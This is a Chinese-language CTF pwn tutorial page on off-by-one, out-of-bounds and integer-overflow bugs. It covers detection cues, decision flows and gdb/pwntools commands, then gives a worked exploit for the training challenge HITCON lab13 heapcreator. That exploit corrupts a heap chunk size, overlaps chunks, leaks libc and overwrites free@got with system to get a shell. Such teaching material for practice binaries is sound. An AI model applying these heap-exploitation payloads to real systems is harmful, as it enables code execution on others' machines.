# 越界与整数问题

关键词：越界 off-by-one off by one 单字节溢出 OOB out-of-bounds 整数溢出 integer overflow 整数回绕 有符号 无符号 signed unsigned size_t int strlen atoi malloc 乘法溢出 截断 负数 chunk overlap 堆重叠 堆块重叠 pwn

## ① 识别指纹

- 附件是 ELF，`checksec` 常见 **Canary / NX 全开**，PIE 与 RELRO 视题目而定；堆题居多
- 反编译里出现 `read(fd, buf, size + 1)`、`buf[size] = '\0'`、`for (i = 0; i <= n; i++)`、`strncpy(dst, src, size)`
- 输入是数字：`size:`、`index:`、`count:`，程序对数字有明显的大小检查
- 菜单题：create / edit / show / delete，size 由用户输入；delete 后指针不清空
- 题目名带 `heap` / `note` / `babyheap` / `overflow` / `integer` / `oob`
- 反编译里出现 `malloc(a * b)`、`calloc`、`realloc`，参数来自输入
- 程序会打印 `invalid size` / `too large` / `index out of range`，说明出题人围绕边界做了检查
- 32 位题更常见整数截断：`int` / `unsigned int` / `short` 只有 4 或 2 字节

## ② 考什么

- `strlen` 遇 `\x00` 停止，与 `read` 实际读入的字节数不是一回事
- `int` 与 `size_t` 混用：负数转 `size_t` 变成巨大值；窄类型截断；符号扩展
- `atoi` 返回 `int`，超范围与负数都不报错；`strtol` 才有 `endptr` 与 `errno`
- `malloc(a * b)` 的乘法在 32 位或 64 位回绕，分配得很小、后续按原值拷贝得很多
- `size + 1`、`len - 1` 的无符号回绕
- 数组下标检查写成 `<=`、只检查上界、允许负数下标
- off-by-one 写坏下一个 chunk 的 `size` / `prev_size` / `PREV_INUSE`
- chunk extend & overlap、fastbin / tcache / unsorted bin 的后续利用
- `read` 的 `size_t` 长度参数、部分读、返回值未检查
- 堆布局 grooming：申请顺序、chunk 大小、tcache 计数、相邻关系

## ③ 判断流程

### ③-1 子类型分流

1. **先 `file` + `checksec` 记录架构与保护** → 写下 32/64 位、Canary、NX、PIE、RELRO → 跳到第 2 条
2. **找“长度多 1”的写法** → 反编译里出现 `read(..., size + 1)`、`buf[size] = 0`、`i <= n`、`strncpy(..., size)` → **off-by-one**，转 ③-2 A 组第 1 条；不存在 → 跳到第 3 条
3. **找数组/对象索引** → 出现 `arr[idx]`、`heaparray[idx]`，且检查只有上界、只有 `<=`、或允许负数 → **OOB**，转 B 组第 1 条；上下界都完整 → 跳到第 4 条
4. **找大小算术与类型转换** → 出现 `malloc(a * b)`、`size + 1`、`len - 1`、`(int)` / `(short)` 强转、`atoi` 结果直接当长度、`strlen` 结果与 `read` 返回值混用 → **整数问题**，转 C 组第 1 条；不存在 → 跳到第 5 条
5. **以上都不成立** → 回第 1 条，改用 gdb 在 `read` / `malloc` 下断点，记录每次调用的长度与返回值；仍无 → 这题不是本页，回 [题型总表](/map)

### ③-2 成本排序链

**A. off-by-one**

1. **确认多出来的 1 字节落在哪** → gdb 在 `read` 返回后执行 `x/8gx buf+size-0x10`，看下一个 chunk 的 `size` 字段地址 → 落在 chunk 头，跳到第 2 条；落在用户数据，跳到第 7 条
2. **构造相邻 chunk** → 先 `create(0x18)` 再 `create(0x10)`：0x18 的内容块 usable size 正好是 0x18，下一个字节就是下一 chunk 的 `size` 低字节 → 确认低字节是 `0x21`，跳到第 3 条；不是这个布局，换申请顺序与大小，回到第 1 条
3. **改 size 低字节** → 写 `0x41` / `0x81` 把 `0x21` 放大，或写 `0x00` 清 `PREV_INUSE` → 改完 `free` 立即 abort，说明新 glibc 的 size 检查拦住了，跳到第 6 条；能正常 `free`，跳到第 4 条
4. **chunk extend & overlap** → `free` 被改大的 chunk，再 `malloc` 一个等于新 size 的块 → 新块覆盖到相邻结构体或用户数据，跳到第 5 条；`malloc` 没有返回该地址，回到第 2 条换 chunk 大小
5. **用重叠改指针/泄露** → 把相邻结构体的 `content` 指针改成 `free@got` / `puts@got`，用 `show` 泄露 libc；再把 `free@got` 改成 `system`，`delete` 一个内容为 `/bin/sh` 的块 → 结束
6. **poison null byte 路线** → 只能写 `\x00` 且目标 chunk 的 size 不小于 `0x100`：清 `PREV_INUSE` 后伪造 `prev_size` 指向可控假 chunk（house of einherjar 思路）→ 伪造成功，跳到第 5 条；被 `corrupted size vs. prev_size` 拦住或目标 size 太小，回到第 1 条换相邻 chunk
7. **以上都不成立** → 放弃 off-by-one，回 ③-1 第 2 条重新分类

**B. OOB**

1. **定位索引检查** → 反编译里找 `if (idx > N)` / `if (idx < 0)`：只有上界，跳到第 2 条；只有 `<=`，跳到第 3 条；上下界都完整，跳到第 5 条
2. **负下标** → 全局数组或栈数组向低地址读到 GOT / 其他全局变量；先用 `show` 读出，再把值写回目标 → 进入第 4 条
3. **上界差一** → `idx == N` 读写数组后第一个对象：数组在堆上，对象是下一个 chunk 头，转 A 组第 4 条；数组在栈上，覆盖相邻变量，进入第 4 条
4. **把 OOB 变成任意读写** → 数组元素是指针时，先 OOB 读泄露，再 OOB 写改指针；目标是 GOT（Partial RELRO）或栈上返回地址 → 结束
5. **索引检查完整但被整数绕过** → `idx * size` 回绕，转 C 组第 1 条；`idx` 为负但被转成无符号比较，转 C 组第 3 条
6. **以上都不成立** → 回第 1 条，换一个输入点或对象；仍无 → 回 ③-1 第 3 条

**C. 整数问题**

1. **找“检查一套算术、分配/拷贝另一套”** → `uint32_t total = n * 8; if (total > 0x1000) reject; buf = malloc(total); read(0, buf, n * 8);`：检查的是回绕后的 `total`，拷贝用的是 64 位的 `n * 8` → 进入第 2 条；两处都使用 `total` → 进入第 3 条
2. **让乘法回绕** → `n` 是 64 位 `size_t`，取 `n = 0x20000000`，`n * 8 = 0x100000000` 赋给 `uint32_t total` 后截成 `0` → `malloc(0)` 得到最小 chunk，`read` 的 count 仍是 `0x100000000` → 堆溢出，转 [堆利用](/pwn/heap)；`total` 没有回绕，回到第 1 条换输入
3. **有符号/无符号混用** → `int len = atoi(s); if (len > 0x1000) reject; read(0, buf, len);`：传 `-1` 通过检查，在 64 位下转 `size_t` 后是 `0xffffffffffffffff`，`read` 会尽量写满 → 进入第 4 条；检查用的是 `size_t` / `unsigned`，`-1` 变成巨大值被拦住 → 进入第 5 条
4. **构造长度** → `read` 只写实际发送的字节，发送量决定溢出长度；先发刚好覆盖到返回地址的量，确认崩溃偏移 → 目标是栈，转 [栈溢出基础](/pwn/stack-basic)；目标是堆，转 [堆利用](/pwn/heap)
5. **`size + 1` 回绕** → 32 位 `uint32_t size = 0xffffffff`，`size + 1` 变 `0` → `malloc(0)` 得到 `0x20` 的 chunk，随后按 `size` 拷贝 → 堆溢出，转 [堆利用](/pwn/heap)
6. **`strlen` 与实际长度不一致** → `n = read(0, buf, 0x100); len = strlen(buf);`：分配/校验用 `len`，拷贝用 `n`，输入里的 `\x00` 让 `len` 偏小 → 拷贝长度大于分配长度，转 [堆利用](/pwn/heap) 或 [栈溢出基础](/pwn/stack-basic)；两处都用 `strlen`，回到第 1 条
7. **以上都不成立** → 回第 1 条，把每个输入数字在 gdb 里跟踪到最终使用点；仍无 → 回 ③-1 第 4 条

## ④ 工具与命令

```bash
file ./pwn
checksec --file=./pwn
# 找危险调用点：read / memcpy / strcpy / malloc / atoi / strlen
objdump -d ./pwn | grep -E 'call.*(read|memcpy|strcpy|malloc|calloc|atoi|strlen)'
strings -a ./pwn | grep -Ei 'size|index|too (large|small)|invalid'
```

```bash
# gdb / pwndbg：看 chunk 头与相邻关系
gdb ./pwn
pwndbg> b *main+0x...          # 断在 read 返回后
pwndbg> x/8gx $rdi             # 输入缓冲区与下一个 chunk 的 size
pwndbg> heap
pwndbg> vis_heap_chunks
pwndbg> bins
pwndbg> chunkinfo 0x...
```

```python
# 按目标位宽模拟回绕，不要用本机默认的 int 宽度
from ctypes import c_int, c_uint

c_int(0xffffffff).value            # -1
c_uint(0xffffffff).value           # 4294967295
(0x20000000 * 8) & 0xffffffff      # 0
(0xffffffff + 1) & 0xffffffff      # 0
```

```python
from pwn import *

elf = ELF('./pwn', checksec=False)
p = process('./pwn')

# 64 位最小 chunk 的实际大小是 0x20，usable 是 0x18
# malloc(0x18) 的下一个字节就是下一个 chunk 的 size 低字节
payload = b'A' * 0x18 + b'\x41'
p.send(payload)
```

```bash
# 本地 libc 与远程不同时对齐环境
pwninit --bin ./pwn --libc ./libc.so.6
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./pwn
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| `malloc(0)` 返回了非 NULL | glibc 返回最小 chunk，64 位是 `0x20` | 按最小 chunk 规划布局，不要以为分配失败 |
| 传 `-1` 当长度，程序直接崩溃 | 转 `size_t` 后是巨大值，`read` 的 count 仍远超缓冲区 | 先发少量数据确认溢出点，不要一次发几 GB |
| off-by-one 改完 size，`free` 报 `invalid size` | 新 glibc 检查 chunk size 与对齐 | 用可控假 chunk 伪造 `prev_size`，或换 tcache / fastbin 路线 |
| 32 位能打通，64 位打不通 | `int` 宽度与乘法/截断位置不同 | 用 `ctypes` 按目标位宽模拟，再决定输入值 |
| 本地 `atoi` 结果与远程不同 | `long` 宽度不同，`atoi` 先 `strtol` 再截成 `int` | 用 `strtol` 明确位宽，或直接发送二进制长度 |
| `strlen` 算出的长度比预期小 | 输入里含 `\x00` | 改用 `read` 的返回值，或避开 NUL 字节 |
| 堆题本地通、远程不通 | 远程 libc 的 tcache / fastbin 行为不同 | 用题目给的 libc + `pwninit` 对齐 |
| OOB 读了但写不进去 | 目标是只读页或 Full RELRO 的 GOT | 改栈返回地址、堆指针或可写全局变量 |
| `read` 返回值没检查，长度错位 | 网络分包导致部分读 | 分多次发送并用 `recvuntil` 对齐，或让程序循环读满 |
| 改大 chunk size 后 `malloc` 拿不到 | fastbin 按 size 分类，请求大小不对 | 请求大小要落在伪造后的 size 分类里 |

## ⑥ 例题

**题目**：HITCON Training lab13 `heapcreator`（BUUCTF 同名 `hitcontraining_heapcreator`）
**来源**：HITCON Training 公开教学题；BUUCTF 有复现

**题干**：菜单堆题，提供 create / edit / show / delete；远程服务器上有 flag，需要拿到 shell 后读取。

**关键观察**：
- `checksec`：64 位，Partial RELRO，Canary found，NX enabled，**No PIE**，libc 2.23（没有 tcache）
- create 先 `malloc(0x10)` 存 `{size, content}` 结构体，再 `malloc(size)` 存内容，结构体指针放进全局 `heaparray`
- edit 调用 `read_input(content, size + 1)`，比申请的长度多读 1 字节
- `create(0x18)` 的 usable size 正好是 0x18；由于结构体先分配，多出的那 1 字节落在**下一个结构体 chunk** 的 `size` 低字节

**走了哪条链**：③-1 第 2 条（发现 `size + 1`）→ ③-2 A 组第 1 条（确认落点）→ 第 2 条（0x18 与 0x10 相邻）→ 第 3 条（`0x21` 改成 `0x81`）→ 第 4 条（chunk overlap）→ 第 5 条（改 `free@got` 泄露并换 `system`）。

**命令与输出**：

```text
$ checksec --file=./heapcreator
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

关键操作与堆上的变化：

```python
create(0x18, b'/bin/sh\x00'.ljust(0x18, b'A'))   # 结构体 S0 + 内容 C0；C0 的 usable 是 0x18
create(0x10, b'B' * 0x10)       # 结构体 S1 紧跟在 C0 后面
create(0x10, b'D' * 0x10)       # 再放一个块，给重叠区域留出后续对象

edit(0, b'/bin/sh\x00'.ljust(0x18, b'A') + b'\x81')
# 把 S1 的 size 从 0x21 改成 0x81
delete(1)                       # free 时按 0x80 的假 size 进入 fastbin
create(0x70, b'C' * 0x70)       # 取回被放大的 0x80 块，覆盖相邻的 struct
```

重叠后改写结构体的 `content` 指针为 `free@got`，`show` 就能泄露 `free` 的真实地址；再把 `free@got` 改成 `system`，`delete(0)` 时内容 `/bin/sh` 作为参数传给 `system`。

```text
[+] free leak: 0x7f...      # 以题目给的 libc 为准
[+] libc base: 0x7f...      # 低 12 位应为 0
$ cat flag
flag{...}
```

**结果**：拿到 shell，读取 flag。heapcreator 的远程 libc 是 2.23，换成新 libc 时 fastbin 与 hook 的行为都会变。

::: tip flag 说明
flag 以原题平台为准，本页不固定具体字符串。这道题的判断价值在于：**看到 `size + 1` 就先量出那 1 字节落在哪，再决定是改 size、清 `PREV_INUSE`，还是直接改相邻结构体指针**。
:::
